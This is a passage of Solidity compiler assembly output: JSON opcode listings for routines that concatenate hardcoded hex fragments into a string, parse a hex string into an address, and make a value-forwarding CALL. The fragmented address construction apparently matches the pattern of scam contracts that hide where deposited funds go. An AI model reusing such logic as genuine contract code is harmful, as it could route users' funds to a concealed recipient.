											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "51"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "51"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 13193,
											"end": 14123,
											"name": "tag",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 13193,
											"end": 14123,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13239,
											"end": 13252,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13265,
											"end": 13293,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "53"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "PUSH",
											"source": 0,
											"value": "7800000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13309,
											"end": 13343,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "54"
										},
										{
											"begin": 13324,
											"end": 13342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 13324,
											"end": 13340,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 13324,
											"end": 13342,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13324,
											"end": 13342,
											"name": "tag",
											"source": 0,
											"value": "55"
										},
										{
											"begin": 13324,
											"end": 13342,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13309,
											"end": 13323,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 13309,
											"end": 13343,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13309,
											"end": 13343,
											"name": "tag",
											"source": 0,
											"value": "54"
										},
										{
											"begin": 13309,
											"end": 13343,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13296,
											"end": 13303,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "tag",
											"source": 0,
											"value": "53"
										},
										{
											"begin": 13296,
											"end": 13344,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13265,
											"end": 13344,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13265,
											"end": 13344,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13355,
											"end": 13371,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13374,
											"end": 13386,
											"name": "PUSH",
											"source": 0,
											"value": "B00859C429"
										},
										{
											"begin": 13355,
											"end": 13386,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13355,
											"end": 13386,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13397,
											"end": 13416,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13419,
											"end": 13429,
											"name": "PUSH",
											"source": 0,
											"value": "49EDF965"
										},
										{
											"begin": 13397,
											"end": 13429,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13397,
											"end": 13429,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13440,
											"end": 13457,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13460,
											"end": 13468,
											"name": "PUSH",
											"source": 0,
											"value": "B71A32"
										},
										{
											"begin": 13440,
											"end": 13468,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13440,
											"end": 13468,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13479,
											"end": 13498,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13501,
											"end": 13519,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 13501,
											"end": 13517,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13501,
											"end": 13519,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13501,
											"end": 13519,
											"name": "tag",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 13501,
											"end": 13519,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13479,
											"end": 13519,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13479,
											"end": 13519,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13530,
											"end": 13548,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 13551,
											"end": 13568,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 13551,
											"end": 13566,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "62"
										},
										{
											"begin": 13551,
											"end": 13568,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13551,
											"end": 13568,
											"name": "tag",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 13551,
											"end": 13568,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13530,
											"end": 13568,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13530,
											"end": 13568,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13581,
											"end": 13604,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13607,
											"end": 13659,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "63"
										},
										{
											"begin": 13615,
											"end": 13629,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 13631,
											"end": 13658,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 13646,
											"end": 13657,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 13631,
											"end": 13645,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 13631,
											"end": 13658,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13631,
											"end": 13658,
											"name": "tag",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 13631,
											"end": 13658,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13607,
											"end": 13614,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 13607,
											"end": 13659,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13607,
											"end": 13659,
											"name": "tag",
											"source": 0,
											"value": "63"
										},
										{
											"begin": 13607,
											"end": 13659,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13581,
											"end": 13659,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13581,
											"end": 13659,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13670,
											"end": 13693,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13696,
											"end": 13765,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 13704,
											"end": 13734,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 13719,
											"end": 13733,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 13704,
											"end": 13718,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 13704,
											"end": 13734,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13704,
											"end": 13734,
											"name": "tag",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 13704,
											"end": 13734,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13736,
											"end": 13764,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 13751,
											"end": 13763,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 13736,
											"end": 13750,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 13736,
											"end": 13764,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13736,
											"end": 13764,
											"name": "tag",
											"source": 0,
											"value": "67"
										},
										{
											"begin": 13736,
											"end": 13764,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13696,
											"end": 13703,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 13696,
											"end": 13765,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13696,
											"end": 13765,
											"name": "tag",
											"source": 0,
											"value": "65"
										},
										{
											"begin": 13696,
											"end": 13765,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13670,
											"end": 13765,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13670,
											"end": 13765,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13776,
											"end": 13799,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13802,
											"end": 13832,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "68"
										},
										{
											"begin": 13817,
											"end": 13831,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 13802,
											"end": 13816,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 13802,
											"end": 13832,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13802,
											"end": 13832,
											"name": "tag",
											"source": 0,
											"value": "68"
										},
										{
											"begin": 13802,
											"end": 13832,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13776,
											"end": 13832,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13776,
											"end": 13832,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13843,
											"end": 13866,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13869,
											"end": 13898,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "69"
										},
										{
											"begin": 13884,
											"end": 13897,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 13869,
											"end": 13883,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 13869,
											"end": 13898,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13869,
											"end": 13898,
											"name": "tag",
											"source": 0,
											"value": "69"
										},
										{
											"begin": 13869,
											"end": 13898,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13843,
											"end": 13898,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13843,
											"end": 13898,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13911,
											"end": 13937,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 13940,
											"end": 14009,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "70"
										},
										{
											"begin": 13948,
											"end": 13977,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "71"
										},
										{
											"begin": 13956,
											"end": 13965,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 13967,
											"end": 13976,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 13948,
											"end": 13955,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 13948,
											"end": 13977,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13948,
											"end": 13977,
											"name": "tag",
											"source": 0,
											"value": "71"
										},
										{
											"begin": 13948,
											"end": 13977,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13979,
											"end": 14008,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "72"
										},
										{
											"begin": 13987,
											"end": 13996,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 13998,
											"end": 14007,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 13979,
											"end": 13986,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 13979,
											"end": 14008,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13979,
											"end": 14008,
											"name": "tag",
											"source": 0,
											"value": "72"
										},
										{
											"begin": 13979,
											"end": 14008,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13940,
											"end": 13947,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 13940,
											"end": 14009,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 13940,
											"end": 14009,
											"name": "tag",
											"source": 0,
											"value": "70"
										},
										{
											"begin": 13940,
											"end": 14009,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 13911,
											"end": 14009,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13911,
											"end": 14009,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14020,
											"end": 14046,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "PUSH",
											"source": 0,
											"value": "3000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14062,
											"end": 14074,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 14049,
											"end": 14056,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "58"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "tag",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 14049,
											"end": 14075,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14020,
											"end": 14075,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14020,
											"end": 14075,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14103,
											"end": 14115,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "SWAP13",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14096,
											"end": 14115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 13193,
											"end": 14123,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 13193,
											"end": 14123,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8382,
											"end": 9321,
											"name": "tag",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 8382,
											"end": 9321,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8445,
											"end": 8460,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8473,
											"end": 8489,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 8498,
											"end": 8500,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8473,
											"end": 8501,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8473,
											"end": 8501,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8512,
											"end": 8525,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8528,
											"end": 8529,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8512,
											"end": 8529,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8512,
											"end": 8529,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8540,
											"end": 8550,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8561,
											"end": 8571,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8589,
											"end": 8595,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8598,
											"end": 8599,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 8589,
											"end": 8599,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8589,
											"end": 8599,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "tag",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8605,
											"end": 8615,
											"name": "PUSH",
											"source": 0,
											"value": "2A"
										},
										{
											"begin": 8601,
											"end": 8602,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8601,
											"end": 8615,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "76"
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8649,
											"end": 8652,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 8640,
											"end": 8652,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8640,
											"end": 8652,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 8640,
											"end": 8652,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 8640,
											"end": 8652,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8689,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8690,
											"end": 8691,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "tag",
											"source": 0,
											"value": "78"
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8686,
											"end": 8692,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 8680,
											"end": 8693,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8680,
											"end": 8693,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8672,
											"end": 8694,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8672,
											"end": 8694,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8667,
											"end": 8694,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8667,
											"end": 8694,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8731,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 8736,
											"end": 8737,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 8732,
											"end": 8733,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8732,
											"end": 8737,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "tag",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8728,
											"end": 8738,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 8722,
											"end": 8739,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 8722,
											"end": 8739,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 8714,
											"end": 8740,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 8714,
											"end": 8740,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8709,
											"end": 8740,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8709,
											"end": 8740,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8766,
											"end": 8768,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 8760,
											"end": 8762,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8760,
											"end": 8768,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8760,
											"end": 8768,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8760,
											"end": 8768,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8760,
											"end": 8768,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8780,
											"end": 8783,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 8774,
											"end": 8776,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8774,
											"end": 8783,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8774,
											"end": 8783,
